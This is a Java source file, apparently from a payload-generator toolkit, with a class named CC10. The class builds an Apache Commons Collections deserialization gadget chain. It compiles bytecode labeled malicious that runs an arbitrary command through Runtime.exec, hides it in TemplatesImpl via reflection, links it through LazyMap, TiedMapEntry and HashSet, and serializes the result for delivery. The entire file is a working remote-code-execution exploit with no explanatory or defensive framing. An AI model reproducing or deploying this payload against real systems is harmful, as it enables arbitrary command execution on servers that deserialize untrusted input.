package top.racerz.payload;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC10 {
    public static byte[] getPayload(String command) throws Exception{
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        // 恶意字节码部分构造
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass poc = classPool.makeClass("POC");
        poc.setSuperclass(classPool.get(AbstractTranslet));
        poc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"" + command + "\");");

        byte[] evilCode = poc.toBytecode();
        // TemplatesImpl 恶意加载类构造 sink
        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field = templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl, new byte[][]{evilCode});

        Field field1 = templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl, "whatever");
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesImpl);

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = null;
        innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = new Object[0];
        array = (Object[]) f2.get(innimpl);
        Object node = array[0];

        if(node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        }catch (Exception e) {
            Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, tiedMapEntry);

        Field field2 =  InvokerTransformer.class.getDeclaredField("iMethodName");
        field2.setAccessible(true);
        field2.set(transformer, "newTransformer");

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(map);
        return bout.toByteArray();
    }
}

